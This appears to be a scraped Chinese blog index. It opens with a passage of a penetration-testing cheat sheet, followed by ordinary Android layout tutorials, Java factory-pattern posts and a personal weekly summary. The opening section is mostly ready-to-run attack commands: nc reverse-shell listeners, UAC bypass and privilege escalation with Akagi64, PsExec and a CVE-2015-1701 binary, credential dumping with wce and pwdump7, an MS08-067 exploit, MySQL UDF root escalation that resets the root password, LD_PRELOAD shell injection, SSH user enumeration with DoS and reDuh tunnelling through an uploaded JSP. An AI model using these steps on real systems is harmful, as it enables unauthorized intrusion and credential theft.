-ExecutionPolicy Bypass -NonInteractive -File script3.ps1# 在 Kali 上创建监听nc -lvp 4444# 以系统权限使用 Akagi64 运行 danger.exe Akagi64.exe 1 C:\Users\User\Desktop\danger.exe# 在 Kali 上创建监听nc -lvp 4444# 下一步就会反弹给我们一个提过权的 shell# 以系统权限使用 PsExec 运行 danger.exe psexec.exe –i –d –accepteula –s danger.exe 以普通用户身份在 Win7 上反弹具有系统权限的 Shell1234567891011121314151617181920212223242526272829https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.htmlhttps://www.exploit-db.com/exploits/37049/# 查找目标机器是否安装了补丁，输入如下命令wmic qfe getwmic qfe | find "3057191"# 上传编译后的利用程序并运行它https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe# 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe# https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 "main.c"# 使用 wce.exe 获取已登录用户的明文账号密码http://www.ampliasecurity.com/research/windows-credentials-editor/wce -w# 使用 pwdump7 获取其他用户的密码哈希值http://www.heise.de/download/pwdump.html# we can try online hash cracking tools such crackstation.net MS08-067 – 不使用 Metasploit123$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205$ searchsploit ms08-067$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1 通过 MySQL Root 账户实现提权12345678910111213141516171819# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)$ wget 0xdeadbeef.info/exploits/raptor_udf2.c$ gcc -g -c raptor_udf2.c$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u root -pmysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file('/home/user/raptor_udf2.so'));mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';mysql&gt; select * from mysql.func;mysql&gt; select do_system('echo "root:passwd" | chpasswd &gt; /tmp/out; chown user:user /tmp/out');user:~$ su -Password:user:~# whoamirootroot:~# iduid=0(root) gid=0(root) groups=0(root) 使用 LD_PRELOAD 注入程序123$ wget https://github.com/jivoi/pentest/ldpreload_shell.c$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft 针对 OpenSSH 用户进行枚举时序攻击注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。 osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。123# https://github.com/c0r3dump3d/osueta$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt 使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。 对了亲～ReDuh-Gui 号称端口转发神器哦。123456789101112131415161718192021# https://github.com/sensepost/reDuh# 步骤 1# 上传 reDuh.jsp 目标服务器$ http://192.168.10.50/uploads/reDuh.jsp# 步骤 2# 在本机运行 reDuhClient $ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp# 步骤 3# 使用 nc 连接管理端口$ nc -nvv 127.0.0.1 1010# 步骤 4# 使用隧道转发本地端口到远程目标端口[createTunnel] 7777:172.16.0.4:3389# 步骤 5# 使用 RDP 连接远程$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android文本框TextView]]></title>
    <url>%2F2017%2F01%2F04%2Fforth%2F</url>
    <content type="text"><![CDATA[补充知识 dp(dip): device independent pixels(设备独立像素). 不同设备有不同的显示效果,这个和设备硬件有关，一般我们为了支持WVGA、HVGA和QVGA 推荐使用这个，不依赖像素。 px: pixels(像素). 不同设备显示效果相同，一般我们HVGA代表320x480像素，这个用的比较多。 pt: point，是一个标准的长度单位，1pt＝1/72英寸，用于印刷业，非常简单易用 sp: scaled pixels(放大像素). 主要用于字体显示best for textsize。 基本属性1234567891011121314151617181920&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" tools:context=".MainActivity" android:gravity="center" android:background="#8fffad"&gt; &lt;TextView android:id="@+id/txtOne" android:layout_width="200dp" android:layout_height="200dp" android:gravity="center" android:text="TextView(显示框)" android:textColor="#EA5246" android:textStyle="bold|italic" android:background="#000000" android:textSize="18sp" /&gt;&lt;/RelativeLayout&gt; id:为TextView设置一个组件id，我们可以在java代码中通过findViewById()的方法获取到该对象，然后进行相关属性的设置，又或者使用RelativeLayout时，参考组件用的也是id。 layout_width:组件的宽度，一般写:wrap_content或者match_parent,前者是控件显示的内容多大，控件就多大，后者会填满该控件所在的父容器，当然也可以设置成特定的大小。 layout_height:组件的宽度，同上 gravity:设置空间中内容的对齐方向。 text:设置文本的内容，一般我们是把字符串写到string.xml然后通过@String/xxx取得对应的字符串内容的。 textColor:设置字体颜色，通过colors.xml textStyle:设置字体风格，可选值:normal,bold,italic(斜体) textSize:字体大小，一般用sp单位 background:空间的背景颜色，可以是图片。 开发例子 android:shadowColor:设置阴影颜色,需要与shadowRadius一起使用哦! android:shadowRadius:设置阴影的模糊程度,设为0.1就变成字体颜色了,建议使用3.0 android:shadowDx:设置阴影在水平方向的偏移,就是水平方向阴影开始的横坐标位置 android:shadowDy:设置阴影在竖直方向的偏移,就是竖直方向阴影开始的纵坐标位置1234567891011&lt;TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_centerInParent="true" android:shadowColor="#F9F900" android:shadowDx="10.0" android:shadowDy="10.0" android:shadowRadius="3.0" android:text="带阴影的TextView" android:textColor="#4A4AFF" android:textSize="30sp" /&gt; drawable的TextViewdrawableTop(上),drawableButtom(下),drawableLeft(左),drawableRight(右)123456789101112131415161718&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" tools:context="com.jay.example.test.MainActivity" &gt; &lt;TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_centerInParent="true" android:drawableTop="@drawable/show1" android:drawableLeft="@drawable/show1" android:drawableRight="@drawable/show1" android:drawableBottom="@drawable/show1" android:drawablePadding="10dp" android:text="张全蛋" /&gt; &lt;/RelativeLayout&gt;]]></content>
      <categories>
        <category>Android</category>
        <category>控件</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android常用两大布局之LinearLayout]]></title>
    <url>%2F2017%2F01%2F04%2Fsecond%2F</url>
    <content type="text"><![CDATA[LinearLayout布局线性布局在开发中使用最多。要想学好布局就要记，没有太多的逻辑，基本上都是初始化的作用，都知道xml是一种数据的格式，用来传递数据的，或者是一个数据的元组。那么Android的布局用xml也是把一个activity的数据存在里面，等要初始化界面的时候就去拿数据，然后初始化，差不多就是这个原理。那么先一起学习属性和属性的参数吧！ LinearLayout常用属性 orientation:布局中组件的排列方式，有horizontal(水平),vertical(竖直,默认),两种方式。 gravity:控制组件所包含的子元素对齐方式，可多个组合,如(left|button) layout_gravity:控制该组件在父容器里的对齐方式 layout_width:布局的宽度，通常不直接写数字的，用wrap_content(组件实际大小),fill_parent或者match_parent填满父容器 layout_height:布局的高度，同上 id:为组件设置一个资源id，在java文件中可以通过findViewById(id)找到该组件 background:为该组件设置一个背景图片，或者直接用颜色覆盖。 weight(权重)该属性是用来等比例地划分区域 最简单的用法:要等比例划分，分谁，谁为0，weight按比例即可 weight使用详解divider分割线该属性用于为LinearLayout设置分割线图片，通过showDividers来设置分割线的所在位置，有四个可选值none,middle,begining,end;当然你还可以通过 divider:为LinearLayout设置分割线图片 showDividers:设置分割线所在的位置，有四个可选值:none，middle,begining,end dividerPadding:设置分割线的padding weight权重属性详解补充:默认启动第一个activity设置，在根目录中的manifeset文件中找到activit标签，在你需要默认的activity中间加入1234&lt;intent-filter&gt; &lt;action android:name="android.intent.action.MAIN" /&gt; &lt;category android:name="android.intent.category.LAUNCHER" /&gt;&lt;intent-filter/&gt; 1、最简单的用法123456789101112131415161718192021&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:id="@+id/LinearLayout1" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="horizontal"&gt; &lt;LinearLayout android:layout_width="0dp" android:layout_height="fill_parent" android:background="#ADFF2F" android:layout_weight="1"/&gt; &lt;LinearLayout android:layout_width="0dp" android:layout_height="fill_parent" android:background="#DA70D6" android:layout_weight="2"/&gt; &lt;/LinearLayout&gt; 要实现第一个的1:1的效果,只需要分别把两个LinearLayout的weight改成1和1就可以了 用法归纳: 按比例划分水平方向:将涉及到的View的android:width属性设置为0dp,然后设置为android weight属性设置比例即可;类推,竖直方向,只需设android:height为0dp,然后设weight属性即可！垂直布局1234567891011121314151617181920&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:id="@+id/LinearLayout1" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical"&gt; &lt;LinearLayout android:layout_width="fill_parent" android:layout_height="0dp" android:background="#ADFF2F" android:layout_weight="1"&gt; &lt;/LinearLayout&gt; &lt;LinearLayout android:layout_width="fill_parent" android:layout_height="0dp" android:background="#DA70D6" android:layout_weight="1"&gt; &lt;/LinearLayout&gt;&lt;/LinearLayout&gt; 垂直布局实用12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:id="@+id/LinearLayout1" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical"&gt; &lt;LinearLayout android:layout_width="fill_parent" android:layout_height="0dp" android:background="#FFFFFF" android:layout_weight="7"&gt; &lt;TextView android:layout_width="fill_parent" android:layout_height="fill_parent" android:text="我要登录" android:textSize="20dp"/&gt; &lt;/LinearLayout&gt; &lt;LinearLayout android:layout_width="fill_parent" android:layout_height="0dp" android:background="#FFFFFF" android:layout_weight="1"&gt; &lt;Button android:layout_width="fill_parent" android:layout_height="fill_parent" android:text="登录" android:textSize="30dp" android:background="#2894FF" android:textColor="#A6A600" android:fontFamily="宋体" android:textColorLink="#C2C287"/&gt; &lt;/LinearLayout&gt;&lt;/LinearLayout&gt; 2、weight属性详解 wrap_content比较简单，直接就按比例。 fill_parent/match_parent这个需要计算，下面是结算算法1234567891011121314151617181920212223242526272829&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:id="@+id/LinearLayout1" android:layout_width="match_parent" android:layout_height="match_parent" &gt; &lt;TextView android:layout_weight="1" android:layout_width="fill_parent" android:layout_height="fill_parent" android:text="one" android:background="#98FB98" /&gt; &lt;TextView android:layout_weight="2" android:layout_width="fill_parent" android:layout_height="fill_parent" android:text="two" android:background="#FFFF00" /&gt; &lt;TextView android:layout_weight="3" android:layout_width="fill_parent" android:layout_height="fill_parent" android:text="three" android:background="#FF00FF" /&gt; &lt;/LinearLayout&gt; 算法:这个时候就会有疑问了,怎么会这样,这比例是2:1吧,那么three去哪了？代码里面明明有 three的啊,还设置了3的,而1和2的比例也不对耶,1:2:3却变成了2:1:0,怎么会这样呢? 答:这里其实没那么简单的,还是需要我们计算的,网上给出的算法有几种,这里就给出笔者 觉得比较容易理解的一种: step 1：个个都是fill_parent,但是屏幕只有一个啦,那么1 - 3 = - 2 fill_parent step 2：依次比例是1/6,2/6,3/6 step 3：先到先得,先分给one,计算: 1 - 2 (1/6) = 2/3 fill_parent 接着到two,计算: 1 - 2 (2/6) = 1/3 fill_parent 最后到three,计算 1 - 2 * (3/6) = 0 fill_parent step 4：所以最后的结果是:one占了两份,two占了一份,three什么都木有 以上就是为什么three没有出现的原因了3、java代码中设置weight属性:12setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.WRAP_CONTENT, 1)); 为LinearLayout设置分割线1、直接在布局中添加一个view这个view的作用仅仅是显示出一条线。1234&lt;View android:layout_width="match_parent" android:layout_height="1px" android:background="#000000" /&gt; 2、实用LinearLayout的一个divider属性,直接为LinearLayout设置分割线 android:divider设置作为分割线的图片 android:showDivider设置分割线的位置,none(无),begining(开始),end(结束),middle(两个组件中间) dividerPadding设置分割线的Padding1234567891011121314151617181920212223242526&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:id="@+id/LinearLayout1" android:layout_width="match_parent" android:layout_height="match_parent" android:divider="@color/colorPrimaryDark" android:orientation="vertical" android:showDividers="middle" android:dividerPadding="10dp"&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="按钮1" /&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="按钮2" /&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="按钮3" /&gt;&lt;/LinearLayout&gt; LinearLayout例子12345678910111213141516171819202122232425262728293031&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:id="@+id/LinearLayout1" android:layout_width="fill_parent" android:layout_height="fill_parent" android:orientation="vertical" tools:context=".MainActivity" &gt; &lt;TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="请输入要保存的电话号码"/&gt; &lt;EditText android:layout_width="fill_parent" android:layout_height="wrap_content"/&gt; &lt;LinearLayout android:layout_width="fill_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="right"&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="保存"/&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="清空"/&gt; &lt;/LinearLayout&gt;&lt;/LinearLayout&gt; gravity属性详解当 android:orientation=”vertical” 时， 只有水平方向的设置才起作用，垂直方向的设置不起作用。 即：left，right，center_horizontal 是生效的。 当 android:orientation=”horizontal” 时， 只有垂直方向的设置才起作用，水平方向的设置不起作用。 即：top，bottom，center_vertical 是生效的。]]></content>
      <categories>
        <category>Android</category>
        <category>布局</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式之工厂方法模式详解]]></title>
    <url>%2F2017%2F01%2F03%2Ffirst%2F</url>
    <content type="text"><![CDATA[应用场景定义:工厂方法模式模式的意义是定义一个创建产品对象的工厂接口，将实际创建工作推迟到子类当中。核心工厂类不再负责产品的创建，这样核心类成为一个抽象工厂角色，仅负责具体工厂子类必须实现的接口，这样进一步抽象的好处是使得工厂方法模式可以使系统在不修改具体工厂角色的情况下引进新的产品。看图说话:可以看到，上面右半部分是产品抽象和实现体系，左半部分是工厂抽象和实现体系，其中工厂体系依赖于产品体系，每一个工厂负责创造一种产品，这就省去了简单工厂中的elseif判断，又客户端决定实例化一个特定的工厂去创建相应的产品。 普通实例实现代码实现:首先是抽象产品接口1234567public interface Light &#123; public void turnOn(); public void turnOff(); &#125; 下面是具体的产品BuldLight产品1234567891011public class BuldLight implements Light&#123; public void turnOn() &#123; System.out.println("BuldLight On"); &#125; public void turnOff() &#123; System.out.println("BuldLight Off"); &#125; &#125; TubeLight产品1234567891011public class TubeLight implements Light&#123; public void turnOn() &#123; System.out.println("TubeLight On"); &#125; public void turnOff() &#123; System.out.println("TubeLight Off"); &#125; &#125; 抽象的工厂接口1234public interface Creator &#123; public Light createLight(); &#125; 创建指定产品的具体工厂BuldCreator工厂1234567public class BuldCreator implements Creator&#123; public Light createLight() &#123; return new BuldLight(); &#125; &#125; TubeCreator工厂123456public class TubeCreator implements Creator&#123; public Light createLight() &#123; return new TubeLight(); &#125; &#125; 测试类1234567891011121314public class Client &#123; public static void main(String[] args) &#123; Creator creator = new BuldCreator(); Light light = creator.createLight(); light.turnOn(); light.turnOff(); creator = new TubeCreator(); light = creator.createLight(); light.turnOn(); light.turnOff(); &#125; &#125; 运行结果:1234BuldLight onBuldLight offTubeLight onTubeLight off 可以看到，我们使用可以随意的在具体的工厂和产品之间切换，并且不需要修改任何代码，就可以让原来的程序正常运行，这也是工厂方法模式对扩展开放的表现，另外工厂方法模式弥补了简单工厂模式不满足开闭原则的诟病，当我们需要增加产品时，只需要增加相应的产品和工厂类，而不需要修改现有的代码。 真实实例实现这个代码没有太大的实际意义。还是来做一个实例，拿数据库来说事吧！第一个接口Driver123456789101112131415161718192021222324package java.sql; import java.sql.DriverPropertyInfo; import java.sql.SQLException; /** * 任何驱动都必须实现的接口。 */ public interface Driver &#123; Connection connect(String url, java.util.Properties info) throws SQLException; boolean acceptsURL(String url) throws SQLException; DriverPropertyInfo[] getPropertyInfo(String url, java.util.Properties info) throws SQLException; int getMajorVersion(); int getMinorVersion(); boolean jdbcCompliant(); &#125; 每个数据库厂商都必须实现这个接口来提供JDBC服务，即java数据库连接服务。第一个方法是创建数据库连接，虽然方法名称是connect,但是我觉得这个方法完全可以改为crateConnection。123456789101112131415161718package java.sql; import java.sql.PreparedStatement; import java.sql.SQLException; /** * &lt;P&gt;A connection (session) with a specific * database. SQL statements are executed and results are returned * within the context of a connection. * &lt;P&gt; */ public interface Connection extends Wrapper &#123; Statement createStatement() throws SQLException; PreparedStatement prepareStatement(String sql) throws SQLException; &#125; 以上两个方法是JDBC API的一部分，也是最重要的部分。它们相当于告诉了数据库生产厂商两个要求。 第一，数据库厂商要提供了一个数据库驱动类，他的作用可以是可以创造数据库连接，而这个数据库连接向上转型为我们JDBC的Connection。 第二，数据库厂商要提供一个数据库连接的实现类，这个实现类可以执行具体数据库的各个操作，比如帮我们执行SQL，执行返回结果，关闭连接等等。我们都知道MySQL的驱动类位于com.mysql.jdbc.Driver，而mysql的connection实现类也在这个包中，名称是ConnectionImpl，而相应的Oracle也有驱动类，位于oracle.jdbc.driver.OracleDriver，相应的oracle也有connection实现类，位于oracle.jdbc.OracleConnectionWrapper。一般每个数据库都会有一个Connection的扩展接口，这个接口的作用是提供使用者针对当前数据库特殊的操作。工厂方法模式就是提供一个抽象的工厂，一个抽象的产品，在上述当中相当于Driver（数据库连接工厂）和Connection（抽象产品），实现的一方需要提供一个具体的工厂类（比如mysql驱动）和一个具体的产品（比如mysql数据库连接）。DriverMananger在这个设计当中扮演者一个管理者的角色，它帮我们管理数据库驱动，让我们不需要直接接触驱动接口，我们获取连接只需要和DriverManager打交道就可以，也就是说客户端依赖于DriverManager和Connection就可以完成工作，不再需要与Driver关联，所以上述说我们依赖于Driver和Connection，现在DriverManager帮我们管理Driver，那我们只需要依赖于DriverManager和Connection就可以了。mysql源代码 123456789101112131415161718public class Driver extends NonRegisteringDriver implements java.sql.Driver &#123; public Driver() throws SQLException &#123; &#125; static &#123; try &#123; DriverManager.registerDriver(new Driver()); &#125; catch (SQLException E) &#123; throw new RuntimeException("Can't register driver!"); &#125; &#125; &#125; 可以看到，在类构造方法中，加入了registerDriver这个方法，所以当我们使用class.forName加载驱动的时候，将会把mysql驱动注册到DriverManager，这时DriverManager中就会持有Mysql驱动所必要的信息，我们就可以使用DriverManager来获得具体的mysql连接了，当然，你要提供url，用户名和密码。工厂方法模式的好处和适用的场景都相对比较好理解。从类关系上来说，它可以让客户端与具体的工厂与产品解耦，从业务角度来说，它让客户端与具体的产品解耦。适用的场景就是我们需要一个产品帮我们完成一项任务，但是这个产品有可能有很多品牌（像这里的mysql，oracle），为了保持我们对产品操作的一致性，我们就可能要用到工厂方法模式。假设产品数量巨多，而且需要我们亲手去逐个实现的时候，工厂方法模式就会增加系统的复杂性，到处都是工厂类和产品类，而且这里所说的工厂类和产品类只是概念上的，真正的产品可能不是一两个类就能搞定，否则mysql和oracle的驱动包为啥要那么多类，而不是就一个Driver和一个Connection。 总结两种使用方式一种是对使用者透明的，一种是不透明的，一种是使用者对具体的产品不关心，这种情况下，一般产品提供的功能是类似的。一种是使用者非常了解产品的特性，并想使用产品的特性，这种情况下，一般产品只提供最基本的一致的功能，但每个产品都会有自己独特的一面。真正做项目的过程当中很少用到工厂方法模式，这个模式更多的是帮助我们理解现有的开源项目，就像现在，你是不是对JDBC的大体框架有了一定认识了呢，如果你不知道这个模式，可能看源码会觉得一头雾水呢。规则只是用来指导你的，不是用来限制你的，只要设计合理，你的设计就是规则！ 需要声明一个注解，它可以用来给servlet标识它的名称。 需要声明一个注解的处理器，用来处理我们的注解，主要作用是通过一个CLASS文件，去获得它的注解信息。 基于性能，我们需要将servlet与名称的映射与应用的生命周期绑定，并且这份映射在整个应用当中有且仅有一份，且不可更改。 让我们用于分派请求的过滤器，使用映射信息将客户请求对应到相应的servlet去处理，并且将分派逻辑移回过滤器，从而彻底删除简单工厂，即ServletFactory。]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017第一周总结]]></title>
    <url>%2F2017%2F01%2F02%2Ffirst%2F</url>
    <content type="text"><![CDATA[总结 今天早上做了STC89C52单片机的小DEMO，这让我对软硬件有了自己的见解。以前做软件打交道的都是客户的需求，具体点，应该是客户的数据，客户存入的数据也好，还是O2O也好，软件主要是对这些数据存储，处理，筛选，增删改查。这里面估计也会涉及一些硬件，比如说电脑的播放器，键盘，鼠标，显示器，这是软件的输入输出设备，非常简单。包括现在的安卓，加了一些新硬件，这让人们更适用，比如陀螺仪，红外感应等等。但最终还是对用户数据的一种处理，从而达到提醒用户或者与用户间接性的交流。主要是对数据的处理。 硬件是什么呢，我觉得是数据的来源不同了，硬件的可以来源于用户，也可以来源于一个机器的录音器，感应器，基本也就是人类的视觉，听觉，触觉。那么当硬件感触到这些最主要的特点就是做出回应，不一定是视觉，听觉了，回应的可能是一个动作，视觉，听觉。那么也就必有有一个东西能让这些东西去动，而且是根绝视觉，听觉，触觉做出各种各样的动作，这个我觉得要归功于芯片，这个东西真是个好东西。硬件涉及的东西要多一些。主要是对数据的回应。 两者的关系，我感觉是，软件一定要依靠硬件来做数据存储，数据运算。硬件一定要依靠软件的数据来做出有逻辑的回应。但是当你规定了硬件，我也可以不需要了解硬件而去做软件，是因为我们知道了怎么给他数据，他会给我们什么回应，你不了解硬件，只能知道表面，不知道底层怎么处理数据。结论就是软硬件是分不开的。]]></content>
      <categories>
        <category>myself</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式之简单工厂模式]]></title>
    <url>%2F2017%2F01%2F02%2Fsecond%2F</url>
    <content type="text"><![CDATA[应用场景从设计模式的类型上来说，简单工厂模式是属于创建型模式，又叫做静态工厂方法模式，但不属于23中GOF设计模式之一。简单工厂模式是由一个工厂对象决定创建出哪一种产品类的实例。简单工厂模式是工厂模式家族中最简单使用的模式，可以理解为是不同工厂模式的一个特殊实现。 简单工厂模式实例可以看出，上面有一个产品接口IProduct，一个工厂类Creator，两个产品类A,B。工厂类负责整个创建产品的逻辑判断，所以为了能使工厂类能够知道我们需要哪一种产品，我们需要在创建产品时传递给工厂类一个参数，去表明我们想要创建哪种产品。接下来敲代码，呜呜。产品接口IProduct1234public interface IProduct &#123; public void method(); &#125; 两个产品类1234567public class ProductA implements IProduct&#123; public void method() &#123; System.out.println("产品A方法"); &#125; &#125; 1234567public class ProductB implements IProduct&#123; public void method() &#123; System.out.println("产品B方法"); &#125; &#125; 最后一个是工厂类1234567891011121314151617public class Creator &#123; private Creator()&#123;&#125; public static IProduct createProduct(String productName)&#123; if (productName == null) &#123; return null; &#125; if (productName.equals("A")) &#123; return new ProductA(); &#125;else if (productName.equals("B")) &#123; return new ProductB(); &#125;else &#123; return null; &#125; &#125; &#125; 然后我们来看看怎么调用的12345678910public class Client &#123; public static void main(String[] args) &#123; IProduct product1 = Creator.createProduct("A"); product1.method(); IProduct product2 = Creator.createProduct("B"); product2.method(); &#125; &#125; 最后会输出12产品A方法产品B方法 这个代码太简单了，应该都看的懂吧~ 两个产品实现的同一个接口，然后就可以造产品了，就像有两个不同的产品都在一个工厂，你会去让另一个工厂去造A，再让另一个工厂去造B吗？显然不会呀，我肯定让这一个工厂造，就这意思。 简单工厂实战就拿简单的WEB项目来做例子吧。都开发过SSH项目吧！众所周知，我们平时开发web项目大部分是以spring作为平台，来集成各个组件，比如集成struts2来完成业务层与表现层的逻辑，集成hibernate或者ibatis来完成持久层的逻辑。 struts2在这个过程当中提供了分离数据持久层，业务逻辑层以及表现层的责任，有了Struts2，我们不再需要servlet，而是可以将一个普通的Action类作为处理业务逻辑的单元，然后将表现层交给特定的视图去处理，比如JSP,template等等。先把WEB项目中需要的类都列出来。123456789101112131415161718192021import javax.servlet.http.HttpServlet; //假设这是一个小型的WEB项目，我们通常里面会有这些类 //这个类在代理模式出现过，是我们的数据源连接池，用来生产数据库连接。 class DataSource&#123;&#125; //我们一般会有这样一个数据访问的基类，这个类要依赖于数据源 class BaseDao&#123;&#125; //一般会有一系列这样的DAO去继承BaseDao，这一系列的DAO类便是数据持久层 class UserDao extends BaseDao&#123;&#125; class PersonDao extends BaseDao&#123;&#125; class EmployeeDao extends BaseDao&#123;&#125; //我们还会有一系列这样的servlet，他们通常依赖于各个Dao类，这一系列servlet便是我们的业务层 class LoginServlet extends HttpServlet&#123;&#125; class LoginOutServlet extends HttpServlet&#123;&#125; class RegisterServlet extends HttpServlet&#123;&#125; //我们通常还会有HTML页面或者JSP页面，但是这个本次不在考虑范围内，这便是表示层。 我们的servlet一般都是继承自HttpServlet，因为我们在web.xml配置servlet时，所写入的Class需要实现servlet接口，而我们通常采用的传输协议都是HTTP，所以HttpServlet就是我们最好的选择了，它帮我们完成了基本的实现。这三个servlet的功能分别是进行登录，注销，以及注册新用户的功能。但是如果我们让一个Servlet负责多种业务逻辑的话，那我们需要在doPost方法中加入很多if判断，去判断当前的操作。12345678910111213protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //我们加入一个操作的参数，来让servlet做出不同的业务处理 String operation = req.getParameter("operation"); if (operation.equals("login")) &#123; System.out.println("login"); &#125;else if (operation.equals("register")) &#123; System.out.println("register"); &#125;else if (operation.equals("loginout")) &#123; System.out.println("loginout"); &#125;else &#123; throw new RuntimeException("invalid operation"); &#125; &#125; 这种方法并不是很好，因为每次添加一个操作，都要修改doPost这个方法，而且多个业务逻辑都集中在这个一个方法中，会让代码很难维护与扩展，最容易想到的就是下列做法。12345678910111213141516171819202122232425protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //我们加入一个操作的参数，来让servlet做出不同的业务处理 String operation = req.getParameter("operation"); if (operation.equals("login")) &#123; login(); &#125;else if (operation.equals("register")) &#123; register(); &#125;else if (operation.equals("loginout")) &#123; loginout(); &#125;else &#123; throw new RuntimeException("invalid operation"); &#125; &#125; private void login()&#123; System.out.println("login"); &#125; private void register()&#123; System.out.println("register"); &#125; private void loginout()&#123; System.out.println("loginout"); &#125; 这也很烂，我们继续优化。我们看一下Struts2怎么做到的。123456789&lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 这是struts2最核心的filter，它的任务就是分派各个请求，根据请求的URL地址，去找到对应的处理该请求的Action。我们来模拟一个分配请求的过滤器，它的任务就是根据用户的请求去产生响应的servlet处理请求，而这些servlet其实就是上面的例子当中的productA和productB这类的角色，也就是具体的产品，而它们实现的接口正是Servlet这个抽象的产品接口。写出filter12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.web.filter; import java.io.IOException; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.Servlet; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.http.HttpServletRequest; import com.web.factory.ServletFactory; //用来分派请求的filter public class DispatcherFilter implements Filter&#123; private static final String URL_SEPARATOR = "/"; private static final String SERVLET_PREFIX = "servlet/"; private String servletName; public void init(FilterConfig filterConfig) throws ServletException &#123;&#125; public void destroy() &#123;&#125; public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,FilterChain filterChain) throws IOException, ServletException &#123; parseRequestURI((HttpServletRequest) servletRequest); //这里为了体现我们本节的重点，我们采用一个工厂来帮我们制造Action if (servletName != null) &#123; //这里使用的正是简单工厂模式，创造出一个servlet，然后我们将请求转交给servlet处理 Servlet servlet = ServletFactory.createServlet(servletName); servlet.service(servletRequest, servletResponse); &#125;else &#123; 